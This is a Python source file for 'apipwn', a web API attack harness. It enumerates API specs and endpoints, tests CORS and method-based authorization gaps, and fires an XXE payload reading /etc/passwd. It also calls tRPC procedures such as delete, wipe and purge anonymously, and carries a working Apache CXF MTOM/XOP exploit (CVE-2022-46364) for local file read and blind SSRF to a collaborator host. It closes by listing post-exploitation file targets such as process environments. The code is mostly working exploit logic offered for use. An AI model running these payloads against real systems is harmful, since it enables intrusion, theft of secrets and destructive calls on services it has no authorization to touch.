#!/usr/bin/env python3
"""apipwn - Web API pentest harness (Hacktricks "Web API Pentesting" methodology).

Stdlib only. No external deps.

Modules
-------
recon   OpenAPI/Swagger/WSDL discovery, endpoint + auth-scheme enumeration.
probe   HTTP method tampering, CORS credential reflection, content-type
        switching (XML parser reachability -> XXE candidate), API version
        downgrade, parameter pollution, TRACE/XST.
trpc    tRPC protectedProcedure BOLA: enumerate <router>.<procedure>,
        fire {"input":{}} anonymously, flag privileged procedures that
        answer without a role check.
cxf     Apache CXF MTOM/XOP xop:Include primitive (CVE-2022-46364):
        multipart/related + application/xop+xml body, file:// local read
        and http:// blind SSRF, reflection detection.

Usage
-----
  ./apipwn.py all    --target https://TARGET --out findings.json
  ./apipwn.py recon  --target https://TARGET
  ./apipwn.py probe  --target https://TARGET --spec spec.json
  ./apipwn.py trpc   --target https://TARGET --routers backgroundMigrations,admin
  ./apipwn.py cxf    --target https://TARGET/soap --op getFile --param path
  ./apipwn.py selftest

Auth: --header 'Authorization: Bearer X' (repeatable), --cookie 'a=b; c=d'.
Every module also runs an anonymous pass; the delta is what the report shows.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field, asdict

VERSION = "1.0.0"
UA = "apipwn/%s (+authorized-assessment)" % VERSION

# --------------------------------------------------------------------------
# findings
# --------------------------------------------------------------------------

SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


@dataclass
class Finding:
    module: str
    kind: str
    severity: str
    title: str
    url: str
    method: str = ""
    status: int = 0
    evidence: str = ""
    detail: dict = field(default_factory=dict)

    @property
    def key(self) -> str:
        return "%s|%s|%s|%s" % (self.kind, self.method, self.url, self.title)


class Report:
    def __init__(self) -> None:
        self.findings: list[Finding] = []
        self._seen: set[str] = set()
        self.meta: dict = {"tool": "apipwn", "version": VERSION}

    def add(self, f: Finding) -> bool:
        if f.key in self._seen:
            return False
        self._seen.add(f.key)
        self.findings.append(f)
        return True

    def sorted(self) -> list[Finding]:
        return sorted(self.findings, key=lambda f: (SEV_ORDER.get(f.severity, 9), f.module))

    def counts(self) -> dict:
        c: dict[str, int] = {}
        for f in self.findings:
            c[f.severity] = c.get(f.severity, 0) + 1
        return c

    def to_dict(self) -> dict:
        return {
            "meta": self.meta,
            "counts": self.counts(),
            "findings": [asdict(f) for f in self.sorted()],
        }

    def dump(self, path: str) -> None:
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(self.to_dict(), fh, indent=2)
        print("[+] report -> %s (%d findings)" % (path, len(self.findings)))

    def print_summary(self) -> None:
        print("\n=== apipwn summary ===")
        if not self.findings:
            print("no findings")
            return
        for f in self.sorted():
            print("[%-8s] %-28s %s %s" % (f.severity.upper(), f.kind, f.method, f.url))
            if f.evidence:
                print("           %s" % f.evidence.replace("\n", " ")[:200])
        print("\ncounts: %s" % json.dumps(self.counts()))


# --------------------------------------------------------------------------
# HTTP
# --------------------------------------------------------------------------


@dataclass
class Resp:
    status: int
    headers: dict
    body: bytes
    url: str = ""

    @property
    def text(self) -> str:
        try:
            return self.body.decode("utf-8", "replace")
        except Exception:
            return ""

    def header(self, name: str) -> str:
        for k, v in self.headers.items():
            if k.lower() == name.lower():
                return v
        return ""

    def json(self):
        try:
            return json.loads(self.text)
        except Exception:
            return None


class Client:
    """Rate-limited, thread-safe HTTP client with optional proxy + auth."""

    def __init__(
        self,
        timeout: float = 15.0,
        proxy: str | None = None,
        headers: list[str] | None = None,
        cookie: str | None = None,
        rate: float = 0.0,
        verify_tls: bool = False,
    ) -> None:
        self.timeout = timeout
        self.rate = rate
        self._lock = threading.Lock()
        self._last = 0.0
        self.base_headers = {
            "User-Agent": UA,
            "Accept": "*/*",
            "Accept-Encoding": "identity",
            "Connection": "close",
        }
        for h in headers or []:
            if ":" in h:
                k, v = h.split(":", 1)
                self.base_headers[k.strip()] = v.strip()
        if cookie:
            self.base_headers["Cookie"] = cookie

        ctx = ssl.create_default_context()
        if not verify_tls:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        handlers: list[urllib.request.BaseHandler] = [urllib.request.HTTPSHandler(context=ctx)]
        if proxy:
            handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        else:
            handlers.append(urllib.request.ProxyHandler({}))
        self.opener = urllib.request.build_opener(*handlers)

    def _throttle(self) -> None:
        if self.rate <= 0:
            return
        with self._lock:
            now = time.monotonic()
            wait = self.rate - (now - self._last)
            if wait > 0:
                time.sleep(wait)
            self._last = time.monotonic()

    def request(
        self,
        method: str,
        url: str,
        headers: dict | None = None,
        body: bytes | None = None,
        timeout: float | None = None,
    ) -> Resp:
        self._throttle()
        h = dict(self.base_headers)
        if headers:
            h.update(headers)
        req = urllib.request.Request(url, data=body, method=method.upper())
        for k, v in h.items():
            req.add_header(k, v)
        try:
            with self.opener.open(req, timeout=timeout or self.timeout) as r:
                return Resp(r.status, dict(r.headers), r.read(), url)
        except urllib.error.HTTPError as e:
            try:
                data = e.read()
            except Exception:
                data = b""
            return Resp(e.code, dict(e.headers or {}), data, url)
        except Exception as e:  # timeout, DNS, TLS, reset
            return Resp(0, {}, str(e).encode(), url)

    def get(self, url: str, **kw) -> Resp:
        return self.request("GET", url, **kw)


# --------------------------------------------------------------------------
# recon
# --------------------------------------------------------------------------

SPEC_PATHS = [
    "/openapi.json",
    "/openapi.yaml",
    "/swagger.json",
    "/swagger/v1/swagger.json",
    "/v2/api-docs",
    "/v3/api-docs",
    "/api-docs",
    "/api/openapi.json",
    "/api/swagger.json",
    "/api/v1/openapi.json",
    "/docs/openapi.json",
    "/swagger-resources",
    "/.well-known/openapi.json",
    "/api/schema/",
    "/spec",
    "/api/spec",
]

GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/v1/graphql", "/query"]

WORDLIST = [
    "/users", "/user", "/accounts", "/account", "/admin", "/admin/users",
    "/auth/login", "/auth/token", "/auth/register", "/login", "/token",
    "/orders", "/products", "/invoices", "/payments", "/transactions",
    "/config", "/settings", "/health", "/status", "/metrics", "/internal",
    "/debug", "/files", "/upload", "/export", "/reports", "/tenants",
    "/organizations", "/teams", "/me", "/profile", "/sessions", "/keys",
    "/api-keys", "/webhooks", "/jobs", "/tasks", "/migrations", "/flags",
]


def _join(base: str, path: str) -> str:
    return base.rstrip("/") + "/" + path.lstrip("/")


def parse_openapi(doc: dict) -> tuple[list[dict], str, dict]:
    """Return (endpoints, base_path, security_schemes)."""
    eps: list[dict] = []
    base_path = ""
    schemes: dict = {}

    if isinstance(doc.get("servers"), list) and doc["servers"]:
        u = doc["servers"][0].get("url", "") or ""
        if u.startswith("/"):
            base_path = u
        elif u:
            base_path = urllib.parse.urlparse(u).path

    if isinstance(doc.get("basePath"), str):
        base_path = doc["basePath"]

    comps = doc.get("components") or {}
    schemes = (comps.get("securitySchemes") or doc.get("securityDefinitions") or {})

    for path, item in (doc.get("paths") or {}).items():
        if not isinstance(item, dict):
            continue
        for m in ("get", "post", "put", "patch", "delete", "head", "options", "trace"):
            if m in item:
                op = item[m] if isinstance(item[m], dict) else {}
                eps.append(
                    {
                        "path": path,
                        "method": m.upper(),
                        "op_id": op.get("operationId", ""),
                        "params": [
                            p.get("name")
                            for p in (op.get("parameters") or [])
                            if isinstance(p, dict)
                        ],
                        "security": op.get("security", item.get("security")),
                    }
                )
    return eps, base_path, schemes


def module_recon(c: Client, target: str, rep: Report) -> dict:
    """Spec discovery. Returns {"endpoints": [...], "spec_url": str, "base_path": str}."""
    out = {"endpoints": [], "spec_url": "", "base_path": "", "schemes": {}, "graphql": []}

    for p in SPEC_PATHS:
        url = _join(target, p)
        r = c.get(url)
        if r.status != 200 or len(r.body) < 40:
            continue
        doc = r.json()
        if not isinstance(doc, dict):
            continue
        if "paths" in doc or "openapi" in doc or "swagger" in doc:
            eps, base_path, schemes = parse_openapi(doc)
            out.update(spec_url=url, endpoints=eps, base_path=base_path, schemes=schemes)
            rep.add(
                Finding(
                    module="recon",
                    kind="spec_exposed",
                    severity="low",
                    title="API specification publicly reachable",
                    url=url,
                    method="GET",
                    status=r.status,
                    evidence="%d paths, %d operations, security=%s"
                    % (len(doc.get("paths") or {}), len(eps), ",".join(schemes) or "none"),
                    detail={"schemes": list(schemes)},
                )
            )
            break

    # WSDL / SOAP surface
    for p in ("", "/service", "/soap", "/ws", "/axis2/services"):
        url = _join(target, p) + ("?wsdl" if p else "/?wsdl")
        r = c.get(url)
        if r.status == 200 and ("definitions" in r.text or "wsdl:" in r.text):
            rep.add(
                Finding(
                    module="recon",
                    kind="wsdl_exposed",
                    severity="low",
                    title="WSDL exposed - SOAP operation map",
                    url=url,
                    method="GET",
                    status=r.status,
                    evidence="%d bytes of WSDL" % len(r.body),
                )
            )
            out["wsdl"] = url
            break

    # GraphQL introspection
    for p in GRAPHQL_PATHS:
        url = _join(target, p)
        q = json.dumps({"query": "{__schema{types{name kind}}}"}).encode()
        r = c.request("POST", url, {"Content-Type": "application/json"}, q)
        if r.status == 200 and "__schema" in r.text:
            rep.add(
                Finding(
                    module="recon",
                    kind="graphql_introspection",
                    severity="medium",
                    title="GraphQL introspection enabled",
                    url=url,
                    method="POST",
                    status=r.status,
                    evidence="__schema returned to anonymous caller",
                )
            )
            out["graphql"].append(url)
            break

    # No spec -> fall back to wordlist enumeration
    if not out["endpoints"]:
        found = []
        prefixes = ["", "/api", "/api/v1", "/v1"]

        def probe(path: str):
            for pre in prefixes:
                url = _join(target, pre + path)
                r = c.get(url)
                if r.status in (200, 201, 204, 401, 403, 405):
                    return {"path": pre + path, "method": "GET", "status": r.status}
            return None

        with ThreadPoolExecutor(max_workers=12) as ex:
            for res in ex.map(probe, WORDLIST):
                if res:
                    found.append(res)
        out["endpoints"] = found
        if found:
            rep.add(
                Finding(
                    module="recon",
                    kind="endpoint_enum",
                    severity="info",
                    title="Endpoints reachable without a spec",
                    url=target,
                    evidence=", ".join("%s[%s]" % (e["path"], e["status"]) for e in found[:12]),
                    detail={"endpoints": found},
                )
            )

    print("[recon] spec=%s endpoints=%d graphql=%s"
          % (out["spec_url"] or "none", len(out["endpoints"]), out["graphql"] or "none"))
    return out


# --------------------------------------------------------------------------
# probe
# --------------------------------------------------------------------------

METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE"]
AUTH_STATUS = (401, 403)


def _endpoint_url(target: str, base_path: str, path: str) -> str:
    if path.startswith("http"):
        return path
    if base_path and path.startswith(base_path):
        return _join(target, path)
    return _join(target, (base_path or "") + path)


def _version_variants(path: str) -> list[str]:
    m = re.search(r"/v(\d+)(?=/|$)", path)
    variants = []
    if m:
        for v in ("1", "2", "3", "4", "beta", "internal", "legacy"):
            variants.append(path[: m.start()] + "/v" + v + path[m.end():])
        variants.append(path[: m.start()] + path[m.end():])  # unversioned
    else:
        variants.append(path.rstrip("/") + "/v1" if not path.endswith("/v1") else path)
    seen, uniq = set(), []
    for v in variants:
        if v not in seen and v != path:
            seen.add(v)
            uniq.append(v)
    return uniq


def module_probe(c: Client, target: str, rep: Report, recon: dict) -> None:
    eps = recon.get("endpoints") or []
    base_path = recon.get("base_path") or ""

    # de-dup to unique paths
    paths: list[str] = []
    for e in eps:
        p = e.get("path") or ""
        if p and p not in paths:
            paths.append(p)

    def work(path: str) -> None:
        url = _endpoint_url(target, base_path, path)
        results = {}
        for m in METHODS:
            body = None
            hdrs = {}
            if m in ("POST", "PUT", "PATCH"):
                body = b"{}"
                hdrs["Content-Type"] = "application/json"
            r = c.request(m, url, hdrs, body)
            results[m] = r
            if m == "TRACE" and r.status == 200 and "TRACE" in r.text.upper():
                rep.add(
                    Finding(
                        module="probe", kind="trace_enabled", severity="low",
                        title="HTTP TRACE enabled (XST surface)", url=url, method="TRACE",
                        status=r.status, evidence=r.text[:120].replace("\n", " "),
                    )
                )

        # method-based authorization gap
        base = results.get("GET")
        if base and base.status in AUTH_STATUS:
            for m in ("POST", "PUT", "PATCH", "DELETE"):
                r = results.get(m)
                if r and 200 <= r.status < 300:
                    rep.add(
                        Finding(
                            module="probe", kind="method_authz_gap", severity="high",
                            title="Auth enforced on GET but not on %s" % m,
                            url=url, method=m, status=r.status,
                            evidence="GET=%d %s=%d body=%s"
                            % (base.status, m, r.status, r.text[:120].replace("\n", " ")),
                        )
                    )
                    break

        # CORS credential reflection
        origin = "https://evil.apipwn.test"
        r = c.get(url, headers={"Origin": origin, "Access-Control-Request-Method": "GET"})
        acao = r.header("Access-Control-Allow-Origin")
        acac = r.header("Access-Control-Allow-Credentials").lower()
        if acao == origin or acao == "*":
            sev = "high" if (acao == origin and acac == "true") else "medium"
            rep.add(
                Finding(
                    module="probe",
                    kind="cors_reflection" if acao == origin else "cors_wildcard",
                    severity=sev,
                    title="CORS %s%s"
                    % ("reflects arbitrary origin" if acao == origin else "wildcard origin",
                       " with credentials" if acac == "true" else ""),
                    url=url, method="GET", status=r.status,
                    evidence="ACAO=%s ACAC=%s" % (acao, acac or "-"),
                )
            )

        # content-type switching -> XML parser reachable
        if "POST" in results and results["POST"].status < 500:
            xml_body = (
                b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
                b'<r><a>&x;</a></r>'
            )
            rx = c.request("POST", url, {"Content-Type": "application/xml"}, xml_body)
            low = rx.text.lower()
            if rx.status in (200, 400, 415, 500) and any(
                s in low for s in ("xml", "sax", "doctype", "entity", "unmarshal", "jaxb")
            ):
                if "root:x:0:0" in rx.text:
                    rep.add(
                        Finding(
                            module="probe", kind="xxe_confirmed", severity="critical",
                            title="XXE via content-type switch (entity expanded)",
                            url=url, method="POST", status=rx.status,
                            evidence=rx.text[:200].replace("\n", " "),
                        )
                    )
                else:
                    rep.add(
                        Finding(
                            module="probe", kind="xml_parser_reachable", severity="medium",
                            title="Endpoint parses XML on content-type switch (XXE candidate)",
                            url=url, method="POST", status=rx.status,
                            evidence="%s ... %s" % (rx.header("Content-Type"), low[:120]),
                        )
                    )

        # parameter pollution
        if "?" not in url:
            r1 = c.get(url + "?id=1")
            r2 = c.get(url + "?id=1&id=2")
            if r1.status == r2.status == 200 and len(r1.body) != len(r2.body):
                rep.add(
                    Finding(
                        module="probe", kind="param_pollution_diff", severity="low",
                        title="Duplicate parameter changes response (HPP candidate)",
                        url=url, method="GET", status=r2.status,
                        evidence="len(%d) != len(%d) for id=1 vs id=1&id=2"
                        % (len(r1.body), len(r2.body)),
                    )
                )

        # version downgrade
        for vp in _version_variants(path):
            vurl = _endpoint_url(target, base_path, vp)
            rv = c.get(vurl)
            if rv.status in AUTH_STATUS:
                continue
            if 200 <= rv.status < 300 and base and base.status in AUTH_STATUS:
                rep.add(
                    Finding(
                        module="probe", kind="version_downgrade", severity="high",
                        title="Older/unversioned API path skips auth",
                        url=vurl, method="GET", status=rv.status,
                        evidence="%s -> %d, current %s -> %d"
                        % (vp, rv.status, path, base.status),
                    )
                )
                break

    with ThreadPoolExecutor(max_workers=8) as ex:
        list(ex.map(work, paths))
    print("[probe] tested %d endpoints" % len(paths))


# --------------------------------------------------------------------------
# trpc
# --------------------------------------------------------------------------

TRPC_PREFIXES = ["/api/trpc", "/trpc", "/api/trpc/v10"]
TRPC_PROCS = [
    "all", "list", "get", "status", "count", "search",
    "create", "update", "delete", "deleteAll", "wipe", "purge",
    "retry", "restart", "run", "execute", "trigger", "sync", "migrate",
    "admin.all", "admin.list", "admin.users", "admin.deleteUser",
]
TRPC_ROUTERS = [
    "backgroundMigrations", "migrations", "jobs", "workers", "admin",
    "user", "users", "account", "billing", "featureFlags", "flags",
    "tenant", "organization", "team", "post", "order", "internal",
]


def _trpc_ok(r: Resp) -> bool:
    if r.status != 200:
        return False
    d = r.json()
    if not isinstance(d, dict):
        return False
    if "error" in d and d.get("error"):
        return False
    if "result" in d:
        return True
    # batch array shape
    if isinstance(d, list):
        return all(isinstance(x, dict) and "error" not in x for x in d)
    return False


def module_trpc(c: Client, target: str, rep: Report, routers: list[str]) -> None:
    found = 0
    for prefix in TRPC_PREFIXES:
        alive = c.request(
            "POST", _join(target, prefix + "/__apipwn.ping"),
            {"Content-Type": "application/json"}, b'{"input":{}}',
        )
        # a live trpc router answers 404 with a trpc-shaped body, not HTML
        if "trpc" not in alive.text.lower() and alive.status not in (400, 404, 405, 500):
            continue

        for router in routers:
            for proc in TRPC_PROCS:
                url = _join(target, "%s/%s.%s" % (prefix, router, proc))
                r = c.request(
                    "POST", url, {"Content-Type": "application/json"}, b'{"input":{}}'
                )
                if not _trpc_ok(r):
                    continue
                found += 1
                sev = "high" if re.search(
                    r"delete|wipe|purge|admin|retry|restart|execute|migrate", proc
                ) else "medium"
                rep.add(
                    Finding(
                        module="trpc",
                        kind="trpc_anonymous_privileged" if sev == "high" else "trpc_anonymous",
                        severity=sev,
                        title="tRPC procedure answers anonymously: %s.%s" % (router, proc),
                        url=url, method="POST", status=r.status,
                        evidence=r.text[:200].replace("\n", " "),
                        detail={"router": router, "procedure": proc},
                    )
                )
    print("[trpc] %d callable procedures found" % found)


# --------------------------------------------------------------------------
# cxf MTOM/XOP
# --------------------------------------------------------------------------


def mtom_request(op: str, param: str, href: str, ns: str = "http://target/") -> tuple[bytes, str]:
    boundary = "MIME_boundary_apipwn"
    soap = (
        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" '
        'xmlns:xop="http://www.w3.org/2004/08/xop/include">'
        "<soap:Body>"
        '<ns:%s xmlns:ns="%s"><ns:%s>'
        '<xop:Include href="%s"/>'
        "</ns:%s></ns:%s>"
        "</soap:Body></soap:Envelope>" % (op, ns, param, href, param, op)
    )
    body = (
        "--%s\r\n"
        'Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\n'
        "Content-ID: <root.message@cxf.apache.org>\r\n\r\n"
        "%s\r\n--%s--\r\n" % (boundary, soap, boundary)
    ).encode()
    ctype = (
        'multipart/related; type="application/xop+xml"; '
        'start="<root.message@cxf.apache.org>"; boundary="%s"' % boundary
    )
    return body, ctype


def module_cxf(
    c: Client, target: str, rep: Report, op: str, param: str, collab: str | None
) -> None:
    urls = [target]
    for suffix in ("", "/service", "/soap", "/ws", "/cxf"):
        u = target.rstrip("/") + suffix
        if u not in urls:
            urls.append(u)

    for url in urls:
        # baseline: plain SOAP, same op, to learn the parser is alive
        base_body, _ = mtom_request(op, param, "http://127.0.0.1:1/none")
        r0 = c.request("POST", url, {"Content-Type": "text/xml; charset=utf-8"}, base_body)
        if r0.status == 0:
            continue

        body, ctype = mtom_request(op, param, "file:///etc/passwd")
        r = c.request("POST", url, {"Content-Type": ctype}, body)
        if "root:x:0:0" in r.text or "daemon:" in r.text or "/bin/bash" in r.text:
            rep.add(
                Finding(
                    module="cxf", kind="cxf_lfi", severity="critical",
                    title="CXF MTOM xop:Include local file read (/etc/passwd)",
                    url=url, method="POST", status=r.status,
                    evidence=r.text[:300].replace("\n", " "),
                    detail={"op": op, "param": param, "href": "file:///etc/passwd"},
                )
            )
        elif r.status != 0 and r.status != r0.status:
            rep.add(
                Finding(
                    module="cxf", kind="cxf_xop_probe", severity="medium",
                    title="xop:Include changes server behaviour (SSRF candidate)",
                    url=url, method="POST", status=r.status,
                    evidence="baseline=%d xop=%d" % (r0.status, r.status),
                )
            )

        if collab:
            body, ctype = mtom_request(op, param, collab)
            c.request("POST", url, {"Content-Type": ctype}, body)
            print("[cxf] blind SSRF fired -> %s (check collaborator)" % collab)
        break

    # high-value post-read targets, printed as the next-hop list
    print(
        "[cxf] post-LFI targets: /etc/systemd/system/*.service, "
        "/proc/<pid>/cmdline, /proc/<pid>/environ"
    )


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------


def build_client(a) -> Client:
    return Client(
        timeout=a.timeout,
        proxy=a.proxy,
        headers=a.header,
        cookie=a.cookie,
        rate=a.rate,
        verify_tls=a.verify,
    )


def cmd_all(a) -> int:
    target = a.target.rstrip("/")
    c = build_client(a)
    rep = Report()
    rep.meta.update(target=target, started=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))

    recon = module_recon(c, target, rep)
    if a.skip_probe is False:
        module_probe(c, target, rep, recon)
    routers = [x.strip() for x in (a.routers or "").split(",") if x.strip()] or TRPC_ROUTERS
    if not a.skip_trpc:
        module_trpc(c, target, rep, routers)
    if a.soap_op and not a.skip_cxf:
        module_cxf(c, target + (a.soap_path or ""), rep, a.soap_op, a.soap_param, a.collab)

    rep.print_summary()
    if a.out:
        rep.dump(a.out)
    return 0


def cmd_recon(a) -> int:
    rep = Report()
    module_recon(build_client(a), a.target.rstrip("/"), rep)
    rep.print_summary()
    if a.out:
        rep.dump(a.out)
    return 0


def cmd_probe(a) -> int:
    rep = Report()
    c = build_client(a)
    target = a.target.rstrip("/")
    if a.spec:
        with open(a.spec, "r", encoding="utf-8") as fh:
            doc = json.load(fh)
        eps, base_path, schemes = parse_openapi(doc)
        recon = {"endpoints": eps, "base_path": base_path, "schemes": schemes}
    else:
        recon = module_recon(c, target, rep)
    module_probe(c, target, rep, recon)
    rep.print_summary()
    if a.out:
        rep.dump(a.out)
    return 0


def cmd_trpc(a) -> int:
    rep = Report()
    routers = [x.strip() for x in (a.routers or "").split(",") if x.strip()] or TRPC_ROUTERS
    module_trpc(build_client(a), a.target.rstrip("/"), rep, routers)
    rep.print_summary()
    if a.out:
        rep.dump(a.out)
    return 0


def cmd_cxf(a) -> int:
    rep = Report()
    module_cxf(build_client(a), a.target, rep, a.op, a.param, a.collab)
    rep.print_summary()
    if a.out:
        rep.dump(a.out)
    return 0


def cmd_selftest(a) -> int:
    import selftest

    return selftest.main()


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(prog="apipwn", description=__doc__.split("\n")[0])
    p.add_argument("--version", action="version", version=VERSION)
    sub = p.add_subparsers(dest="cmd", required=True)

    def common(sp):
        sp.add_argument("--target", required=True, help="https://TARGET")
        sp.add_argument("--header", action="append", default=[], help="'K: V' (repeatable)")
        sp.add_argument("--cookie", default=None)
        sp.add_argument("--proxy", default=os.environ.get("APIPWN_PROXY"))
        sp.add_argument("--timeout", type=float, default=15.0)
        sp.add_argument("--rate", type=float, default=0.0, help="seconds between requests")
        sp.add_argument("--verify", action="store_true", help="verify TLS certs")
        sp.add_argument("--out", default=None, help="write JSON report")

    sp = sub.add_parser("recon"); common(sp); sp.set_defaults(func=cmd_recon)
    sp = sub.add_parser("probe"); common(sp)
    sp.add_argument("--spec", default=None); sp.set_defaults(func=cmd_probe)
    sp = sub.add_parser("trpc"); common(sp)
    sp.add_argument("--routers", default=None); sp.set_defaults(func=cmd_trpc)

    sp = sub.add_parser("all"); common(sp)
    sp.add_argument("--routers", default=None)
    sp.add_argument("--soap-path", default="/soap")
    sp.add_argument("--soap-op", default=None)
    sp.add_argument("--soap-param", default="arg0")
    sp.add_argument("--collab", default=None)
    sp.add_argument("--skip-probe", action="store_true")
    sp.add_argument("--skip-trpc", action="store_true")
    sp.add_argument("--skip-cxf", action="store_true")
    sp.set_defaults(func=cmd_all)

    sp = sub.add_parser("cxf")
    common(sp)
    sp.add_argument("--op", required=True)
    sp.add_argument("--param", default="arg0")
    sp.add_argument("--collab", default=None)
    sp.set_defaults(func=cmd_cxf)

    sp = sub.add_parser("selftest"); sp.set_defaults(func=cmd_selftest)

    a = p.parse_args(argv)
    return a.func(a)


if __name__ == "__main__":
    sys.exit(main())
